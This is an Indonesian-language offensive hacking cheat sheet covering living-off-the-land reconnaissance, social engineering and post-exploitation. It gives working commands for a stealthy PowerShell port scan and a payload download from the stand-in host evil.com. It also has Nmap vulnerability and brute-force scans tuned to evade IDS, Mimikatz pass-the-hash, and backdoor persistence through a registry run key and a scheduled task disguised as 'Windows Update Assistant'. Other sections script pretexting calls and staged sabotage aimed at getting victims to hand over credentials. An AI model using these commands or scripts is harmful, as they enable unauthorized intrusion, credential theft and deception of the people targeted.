04 // Field Manual Tactics Ref: RTFM

POWERSHELL RECON (Living off the Land)

Jangan download tool scan. Gunakan apa yang sudah ada di Windows.

Port Scan tanpa Nmap

1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.5",$_)) "Port $_ is OPEN"} 2>$null

Script satu baris ini melakukan port scan TCP range 1-1024 menggunakan object .NET native. Tidak terdeteksi sebagai signature "Nmap".

Download File tanpa Browser

(New-Object System.Net.WebClient).DownloadFile("http://evil.com/payload.exe", "C:\Temp\payload.exe")
NMAP ADVANCED (Beyond Basics)

Semua orang tahu -sS. Tapi pemenang menggunakan NSE (Nmap Scripting Engine).

# Deteksi Vulnerability (Mirip Nessus mini)
nmap -Pn --script vuln 192.168.1.5

# Brute Force Telnet (Hati-hati berisik!)
nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=pwds.txt 192.168.1.5
Gunakan flag -T1 (Timing: Sneaky) jika ingin menghindari deteksi IDS/IPS. Scan akan sangat lama tapi stealthy.

05 // Art of Deception Ref: Kevin Mitnick

PRETEXTING & PSYCHOLOGY

Teknik "Technical Jargon" (Otoritas)

Orang cenderung patuh pada teknisi yang terdengar ahli. Jangan bilang "Boleh minta password?".

Katakan: "Bu, sinkronisasi LDAP di node 4 gagal karena token autentikasi ibu corrupt. Saya perlu mereset kredensial sesi agar Ibu bisa login besok. Tolong bacakan kode di layar." (Korban bingung -> Percaya -> Memberi data).

Reciprocity (Timbal Balik)

Berikan sesuatu dulu (bantuan kecil, file pdf, tips), baru minta sesuatu. Manusia diprogram biologis untuk membalas budi.

THE REVERSE STING (Sepuh Level)

Teknik manipulasi tingkat dewa dimana TARGET yang menghubungi ANDA.

  1. Sabotase ringan akses mereka (misal: cabut kabel LAN di ruang meeting atau jamming sinyal WiFi).
  2. Tinggalkan kartu nama "Helpdesk Support Darurat" di meja.
  3. Tunggu mereka panik dan menelepon Anda.
  4. Sekarang Anda adalah PENYELAMAT. Mereka akan memberikan akses apa saja yang Anda minta untuk memperbaiki masalah tersebut.

06 // Advanced Warfare Ref: Hacker Playbook 3

LATERAL MOVEMENT (Pass The Hash)

Anda dapat hash password admin tapi tidak bisa crack (terlalu rumit)? Jangan dicrack. Pakai saja hash-nya.

Mimikatz

sekurlsa::pth /user:Administrator /domain:TARGETDOMAIN /ntlm:b4b9b02e6f09a9bd760f388b67351e2b

Perintah ini membuka CMD baru yang diautentikasi sebagai Admin menggunakan hash NTLM, tanpa perlu tahu password aslinya.

PERSISTENCE (Supaya Tidak Diusir)

Setelah masuk, pastikan Anda bisa kembali walau komputer direstart.

Registry Run Keys

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f

Scheduled Tasks (Lebih Stealth)

schtasks /create /sc minute /mo 30 /tn "Windows Update Assistant" /tr "powershell.exe -WindowStyle hidden -File C:\temp\shell.ps1"

Ini akan menjalankan backdoor setiap 30 menit dengan nama yang terlihat resmi.
